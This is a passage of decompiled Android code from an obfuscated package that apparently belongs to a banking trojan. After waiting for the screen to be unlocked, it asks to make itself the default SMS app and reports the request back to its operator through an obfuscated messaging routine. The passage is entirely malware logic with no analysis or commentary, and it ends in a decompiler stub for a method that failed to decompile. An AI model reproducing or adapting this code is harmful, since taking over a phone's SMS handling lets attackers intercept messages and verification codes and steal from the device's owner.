            android.content.Context r2 = r1.f423e
            java.lang.String r2 = "keyguard"
            java.lang.Object r2 = r1.getSystemService(r2)
            android.app.KeyguardManager r2 = (android.app.KeyguardManager) r2
            boolean r2 = r2.inKeyguardRestrictedInputMode()
            if (r2 != 0) goto L_0x06a1
            java.util.concurrent.TimeUnit r2 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x064b }
            r2.sleep(r4)     // Catch:{ InterruptedException -> 0x064b }
            goto L_0x0650
        L_0x064b:
            r0 = move-exception
            r2 = r0
            r2.printStackTrace()
        L_0x0650:
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            java.lang.String r4 = "swspacket"
            java.lang.String r2 = r2.mo234e(r1, r4)
            android.content.Intent r4 = new android.content.Intent
            java.lang.String r5 = "android.provider.Telephony.ACTION_CHANGE_DEFAULT"
            r4.<init>(r5)
            java.lang.String r5 = "package"
            r4.putExtra(r5, r2)
            r2 = 268435456(0x10000000, float:2.5243549E-29)
            r4.addFlags(r2)
            r1.startActivity(r4)
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            java.lang.String r4 = "4"
            java.lang.StringBuilder r5 = new java.lang.StringBuilder
            r5.<init>()
            java.lang.String r13 = "p="
            r5.append(r13)
            wocwvy.czyxoxmbauu.slsa.b r13 = r1.f420b
            java.lang.StringBuilder r14 = new java.lang.StringBuilder
            r14.<init>()
            wocwvy.czyxoxmbauu.slsa.b r15 = r1.f420b
            java.lang.String r15 = r15.mo247q(r1)
            r14.append(r15)
            java.lang.String r15 = "|Request to change the manager SMS to default|"
        L_0x068c:
            r14.append(r15)
            java.lang.String r14 = r14.toString()
            java.lang.String r13 = r13.mo225c(r14)
            r5.append(r13)
            java.lang.String r5 = r5.toString()
            r2.mo218b(r1, r4, r5)
        L_0x06a1:
            r4 = r3
            goto L_0x015d
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.jtfxlnc.onHandleIntent(android.content.Intent):void");
    }
}
